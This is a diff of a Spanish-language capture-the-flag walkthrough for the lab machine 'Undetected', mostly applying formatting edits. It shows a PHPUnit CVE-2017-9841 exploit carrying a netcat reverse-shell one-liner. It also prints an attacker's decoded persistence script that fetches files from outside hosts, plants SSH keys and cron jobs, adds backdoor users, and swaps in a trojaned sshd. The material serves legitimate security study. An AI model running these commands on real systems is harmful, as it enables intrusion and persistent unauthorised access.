@@ -64,24 +64,24 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
-Vemos el titulo de la web _Diana's Jewelry_ y la versión del servidor apache _2.4.41_, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más, por lo que procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por _ssh_. Ejecutamos la herramienta _whatweb_ en la terminal:
+Vemos el titulo de la web _Diana's Jewelry_ y la versión del servidor apache _2.4.41_, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más; por lo que, procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por _ssh_. Ejecutamos la herramienta __whatweb__ en la terminal:
 ```shell
 ❯ whatweb http://10.10.11.146
 http://10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana\'s Jewelry]
 ```
 
-No obtenemos casi nada relevante (se está usando una versión desactualizada de JQuery, podríamos intentar ver si es vulnerable a prototype pollution ) de momento sigamos enumerando.
+No obtenemos casi nada relevante (se está usando una versión desactualizada de _JQuery_, podríamos intentar ver si es vulnerable a prototype pollution) de momento sigamos enumerando.
 
 Vamos a visualizar la web desde el navegador:
 ![undetected1](/assets/favicon/2022-07-04/undetected1.png)
 
-Todos los botones que hay no nos llevan a ninguna parte interesante a excepción de _store_, el cual es un subdominio "store.djewelry.htb", agregamos este subdominio a nuestro archivo _/etc/hosts_ para que al momento de poner el subdominio en la web, el navegador sepa resolver la dirección.
+Todos los botones que hay, no nos llevan a ninguna parte interesante a excepción de _store_, el cual es un subdominio `store.djewelry.htb`, agregamos este subdominio a nuestro archivo `/etc/hosts` para que al momento de poner el subdominio en la web, el navegador sepa resolver la dirección.
 
 ![undetected2](/assets/favicon/2022-07-04/undetected2.png)
 
 Otra vez, ninguno de los botones nos llevan a ningún lado interesante, incluso en un apartado nos dice que la web está inoperativa para hacer pedidos.
 
-Procedemos a fuzzear directorios lanzando el script "http-enum" de nmap que tiene un diccionario con alrededor de 1000 rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es _djewelry.htb_), hacemos lo mismo para la segunda web con el subdomino _store_ y nos encontramos los siguientes directorios:
+Procedemos a _fuzzear_ directorios lanzando el script `http-enum` de `nmap` que tiene un diccionario con alrededor de `1000` rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es `djewelry.htb`). Hacemos lo mismo para la segunda web con el subdomino `store` y nos encontramos los siguientes directorios:
 
 ```shell
 ❯ nmap -p80 --script http-enum store.djewelry.htb
@@ -95,13 +95,13 @@ PORT   STATE SERVICE
 |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
 |_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
 ```
-ya hay dos cosas que llaman bastante la atención, de primeras la web tiene capacidad de directory listing, y de segundo tenemos una carpeta llamada _vendor_ donde se encuentran librerias de PHP (según practicas que se usan normalmente en el desarrollo).
+Ya hay dos cosas que llaman bastante la atención: de primeras, la web tiene capacidad de _directory listing_ y de segundo tenemos una carpeta llamada _vendor_ donde se encuentran librerias de PHP (según practicas que se usan normalmente en el desarrollo).
 
-Comprobamos que tenemos directory listing y vamos a ver lo que hay en la carpeta _vendor_:
+Comprobamos que tenemos _directory listing_ y vemos lo que hay en la carpeta _vendor_:
 ![undetected3](/assets/favicon/2022-07-04/undetected3.png)
 
 ## Explotando la vulnerabilidad de PHP Unit
-Si hacemos un poco de investigación sobre lo que podemos hacer con lo que tenemos, nos encontramos con la vulnerabilidad [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841). Comprobamos que la ruta para explotar la vulnerabilidad existe, y sí, tenemos la ruta, el código php se interpreta y no nos muestra nada en la web, esto pinta muy bien para nosotros.
+Si hacemos un poco de investigación sobre lo que podemos hacer con lo que tenemos, nos encontramos con la vulnerabilidad [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841). Comprobamos que la ruta para explotar la vulnerabilidad existe. Y sí, tenemos la ruta. El código PHP se interpreta y no nos muestra nada en la web, esto pinta muy bien para nosotros.
 
 Por lo que ejecutando lo siguiente en la terminal:
 ```shell
@@ -109,21 +109,21 @@ Por lo que ejecutando lo siguiente en la terminal:
 ```
 
 Nos damos cuenta de que tenemos RCE (ejecución remota de comados en la máquina victima).
-Vamos a entablarnos una revershell a nuestra interfaz tun0 por el puerto 443 con netcat:
+Vamos a entablarnos una revershell a nuestra interfaz `tun0` por el puerto `443` con `netcat`:
 ```shell
 ❯ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.2 443 >/tmp/f')?>"
 ```
 
-...y poniéndonos en escucha con netcat en otra ventana:
+...y poniéndonos en escucha con `netcat` en otra ventana:
 ```shell
 ❯ nc -nvlp 443
 ```
 
-Ganamos acceso como el usuario _www-data_
+Ganamos acceso como el usuario `www-data`
 Ahora procedemos a hacer el [tratamiento de la tty](https://github.com/barricadadigital/Pentesting/blob/master/pentesting/reverse-shell/tratamiento-de-la-tty.md) para tener una shell interactiva.
 
 ## Escalando prilivegios al usuario steven
-Haciendo reconocimiento básico sobre el sistema con este usuario no encontramos nada de lo que nos podamos aprovechar, sin embargo hay un archivo que llama bastante la atención en la siguiente ruta: _/var/backups/info_ (es un binario)
+Haciendo reconocimiento básico sobre el sistema con este usuario, no encontramos nada de lo que nos podamos aprovechar; sin embargo, hay un archivo que llama bastante la atención en la ruta `/var/backups/info` (es un binario).
 
 Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, escribimos lo siguiente en la máquina victima:
 ```shell
@@ -135,7 +135,7 @@ Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, esc
 ❯ nc -nvlp 4343 > info
 ```
 
-Le hacemos un strings al binario
+Ejecutamos el comando `strings` sobre el binario:
 ```shell
 ❯ strings info
 ```
@@ -143,7 +143,7 @@ Le hacemos un strings al binario
 ...encontramos el siguiente texto dentro de todas las cadenas imprimibles:
 >776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
 
-parece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia, ahora podemos tratarlo con el siguiente comando:
+Parece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia. Ahora podemos tratarlo con el siguiente comando:
 ```shell
 ❯ cat info_hex | xxd -p -r
 ```
@@ -153,7 +153,7 @@ Lo que nos muestra lo siguiente:
 wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
 ```
 
-Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo, yo le pondré "hash". Ahora podemos crackearlo con [John the Ripper](https://www.openwall.com/john/):
+Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo. Yo le pondré `hash`. Ahora podemos crackearlo con [John the Ripper](https://www.openwall.com/john/):
 ```shell
 ❯ john -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
 Using default input encoding: UTF-8
@@ -166,16 +166,16 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Obtenemos en texto claro su equivalencia (linea 7: `ìhatehackers`) ¿De qué usuario? En el /etc/passwd podimos ver que hay dos usuarios con una shell, los cuales son "steven y steven1" (además de root y www-data), probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario steven1.
+Obtenemos en texto claro su equivalencia (linea 7: `ìhatehackers`) ¿De qué usuario? En el `/etc/passwd` podimos ver que hay dos usuarios con una shell, los cuales son "steven y steven1" (además de "root" y "www-data"). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario `steven1`.
 ```shell
 ❯ su steven1
 Password: ihatehackers
 ```
 
-Incluso si probamos la conexión por ssh podemos acceder a ese usuario.
+Incluso si probamos la conexión por ssh, podemos acceder a ese usuario.
 
 ## Escalando privilegios al usuario root
-Procedemos a realizar enumeración con este usuario. Revisando algunos archivos nos encontramos con un email en la siguiente ruta "/var/mail/steven".
+Procedemos a realizar enumeración con este usuario. Revisando algunos archivos nos encontramos con un email en la siguiente ruta `/var/mail/steven`.
 ```shell
 steven@production:/var/mail$ cat steven
 From root@production  Sun, 25 Jul 2021 10:31:12 GMT
@@ -203,11 +203,11 @@ Thanks,
 sysadmin
 ```
 
-El sysadmin le menciona a steven un comportamiento raro con el servidor apache a pesar de haber actualizado el sistema. Vayamos a revisar.
-En la ruta _/lib/apache2/modules_ vemos una cantidad de archivos aparentemente normales, sin embargo, el _comportamiento extraño_ puede darnos la idea de que alguien más ha comprometido el sistema, y por lo tanto ha manipulado archivos para mantener su persistencia, así que revisemos bien los archivos que hay:
+El `sysadmin` le menciona a steven un comportamiento raro con el servidor apache a pesar de haber actualizado el sistema. Vayamos a revisar.
+En la ruta `/lib/apache2/modules` vemos una cantidad de archivos aparentemente normales; sin embargo, el _comportamiento extraño_ puede darnos la idea de que alguien más ha comprometido el sistema, y por lo tanto, ha manipulado archivos para mantener su persistencia. Así que revisemos bien los archivos que hay:
 ![undetected 6](/assets/favicon/2022-07-04/undetected4.png)
 
-Vemos que un archivo ha sido manipulado recientemente 
+Vemos que un archivo ha sido manipulado recientemente: 
 ```shell
 -rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.so
 ```
@@ -217,7 +217,7 @@ Nos traemos el archivo a nuestra máquina para revisarlo como hicimos con el úl
 ❯ strings mod_reader.so
 ```
 
-Hay una cadena en base 64, procedemos a decodificarla y la guardamos en un archivo como evidencia:
+Hay una cadena en base 64. Procedemos a decodificarla y la guardamos en un archivo como evidencia:
 ```shell
 echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d > mod_reader_hex.txt
 ```
@@ -227,11 +227,11 @@ Vemos lo siguiente:
 ❯ cat mod_reader_hex.txt
 wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
 ```
-Esto es un poco raro ya que hay un archivo de apache (mod_reader.so) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.
+Esto es un poco raro ya que hay un archivo de apache (`mod_reader.so`) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.
 
 Puede que el demonio de ssh haya sido manipulado, por lo que vamos a traer el binario de la máquina victima a la nuestra para analizarlo.
 
-Haciendo un strings al binario filtrando por "backdoor" vemos lo siguiente:
+Haciendo un `strings` al binario filtrando por la palabra "backdoor", vemos lo siguiente:
 ```shell
 ❯ strings sshd | grep "backdoor" | sort -u
 backdoor
@@ -241,15 +241,15 @@ backdoor.h
 
 Podemos intuir que efectivamente se ha manipulado el binario.
 
-Abrimos nuestro analizador de confinza [Ghidra](https://github.com/NationalSecurityAgency/ghidra) para decompilar el binario:
+Abrimos nuestro analizador de confinza [Ghidra](https://github.com/NationalSecurityAgency/ghidra) para descompilar el binario:
 ![Ghidra](/assets/favicon/2022-07-04/undetected6.png)
 
-Comenzamos a buscar funciones que pudieron ser modificadas, nos encontramos con la función _auth_passwd_ que tiene lo siguiente:
+Comenzamos a buscar funciones que pudieron ser modificadas, nos encontramos con la función `auth_passwd` que tiene lo siguiente:
 ![Ghidra](/assets/favicon/2022-07-04/undetected7.png)
 
-En la linea 29 puede que no esté interpretando bien el valor, así que lo cambiamos dando click izquierdo sobre él y pinchando en lo que nos interesa, en este caso a _char_.
+En la linea 29 puede que no esté interpretando bien el valor, así que lo cambiamos dando clic izquierdo sobre él y haciendo clic en lo que nos interesa. En este caso a `char`.
 
-Procedamos a analizar lo que está sucediendo allí. Prestemos atención a la variable _backdoor_ la cual tiene un espacio total de 31 caracteres.
+Procedamos a analizar lo que está sucediendo allí. Prestemos atención a la variable "backdoor" la cual tiene un espacio total de 31 caracteres.
 ```c
 /* WARNING: Could not reconcile some variable overlaps */
 int auth_password(ssh *ssh,char *password){
@@ -326,7 +326,7 @@ int auth_password(ssh *ssh,char *password){
 }
 ```
 
-Bueno, vamos a intentar sacar conclusiones sobre lo visto. Parece que hay una palabra clave deconstruida en las variables _backdoor_ y en el bucle _while_ como lo dejé comentado, se está haciendo un XOR, así que vamos a construir esa palabra clave tal que así:
+Bueno, vamos a intentar sacar conclusiones sobre lo visto. Parece que hay una palabra clave deconstruida en las variables "backdoor" y en el bucle `while` como lo dejé comentado. Se está haciendo un `XOR`, así que vamos a construir esa palabra clave tal que así:
 
 ```shell
 backdoor[30] 	= 0xa5;
